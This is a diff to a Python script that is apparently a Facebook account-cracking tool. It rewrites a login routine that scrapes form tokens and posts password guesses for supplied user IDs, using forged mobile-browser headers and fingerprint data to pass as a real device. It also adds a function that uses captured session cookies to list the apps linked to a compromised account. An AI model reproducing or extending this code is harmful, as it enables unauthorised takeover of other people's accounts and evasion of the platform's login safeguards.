@@ -1796,59 +1796,49 @@ def mbasic(uid,pwx,tl):
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
             data = {
-            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            'try_number': '0',
-            'unrecognized_tries': '0',
-            'email': uid,
-            'prefill_contact_point': '',
-            'prefill_source': '',
-            'prefill_type': '',
-            'first_prefill_source': '',
-            'first_prefill_type': '',
-            'had_cp_prefilled': 'false',
-            'had_password_prefilled': 'false',
-            'is_smart_lock': 'false',
-            'bi_xrwh': '0',
-            'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-            'fb_dtsg': 'NAcMquAukYuAVbPDtxd2m_c4NXQqnaFUp7mF28EamasVDOfenuGKe9w:0:0',
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'dyn': '1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhwem0iy1gCwjE2Nwde782Cwro0wa4o1MUaE36wdq0ny1Aw4vw8W0iW220jG3qaw4kwbS1Lw9C0hO3q0ue0QU',
-            'csr': '',
-            'req': '4',
-            'fmt': '1',
-            'a': 'AYkh5-Ex-aRI47lU6Jgp6nOr4nUFJTvg0RTBgdXo6WoapXVQh6_VcCAiJjMlLOcz71dLoR5aOxzCjylrJvKDQrdmi0ungLJpGVEzgx27yKwTyA',
-            'user': '0'}
+            "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number": 0,
+            "unrecognized_tries": 0,
+            "email": uid,
+            "prefill_contact_point": uid,
+            "prefill_source": "browser_dropdown",
+            "prefill_type": "contact_point",
+            "first_prefill_source": "browser_dropdown",
+            "first_prefill_type": "contact_point",
+            "had_cp_prefilled": True,
+            "had_password_prefilled": False,
+            "is_smart_lock": False,
+            "bi_xrwh": 0,
+            "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+            "bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
+            "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             headers ={
-            'Host': 'mbasic.facebook.com',
-            'user-agent': ua,
-            'Accept-Encoding': 'gzip',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Host': f'{fb}.facebook.com',
             'Connection': 'keep-alive',
-            'authority': 'mbasic.facebook.com',
-            'method': 'POST',
-            'path': '/login/device-based/login/async/',
-            'scheme': 'https',
-            'Content-Length': '{len(str(data))}',
-            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-            'cache-control': 'max-age=0',
-            'dpr': '2.75',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+            'Content-Length': '{len(str(logn_data))}',
+            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
+            'sec-ch-ua-model': '"GT-414XOP"',
             'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"X663"',
+            'User-Agent': ua3,
+            'viewport-width': '400',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),
+            'sec-ch-ua-platform-version': '"9.0.0"',
+            'X-ASBD-ID': '129477',
+            'dpr': '1.8',
+            'sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"',
+            'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'viewport-width': '980',
-            'Content-Type': 'application/x-www-form-urlencoded'}
+            'Accept': '*/*',
+            'Origin': f'https://{fb}.facebook.com',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Dest': 'empty',
+            'Referer': f'https://{fb}.facebook.com/login.php?skip_api_login=1&api_key=212500508799908&kid_directed_site=0&app_id=212500508799908&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D212500508799908%26redirect_uri%3Dhttps%253A%252F%252Fwww.codecademy.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D83fb97e0-a6e7-44b6-9da5-92a7b299a035%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.codecademy.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://mbasic.facebook.com/login/device-based/login/async/"
             po = Session.post(url, data=data, headers=headers).text
@@ -2709,6 +2699,31 @@ def cracker(uid, pwx, tl):
     except Exception as error:
         #print({error})
         pass
+
+
+#----------------[ ID-CHECKER ]--------------------------#
+
+def cek_apk(coki):
+	session = requests.Session()
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m➛ %s%s"%(P,H,game[i].replace("Added on"," Added on")))
+	except AttributeError:
+		print ("\r    %s\033[0m cookie invalid"%(M))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+coki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m➛ %s"%(P,game[i].replace("Expired"," Expired")))
+	except AttributeError:
+		print ("\r    %s \033[0mcookie invalid"%(M))
+#-----------------------[ SYSTEM-CONTROL ]--------------------#
 
 os.system("clear")
 Process()
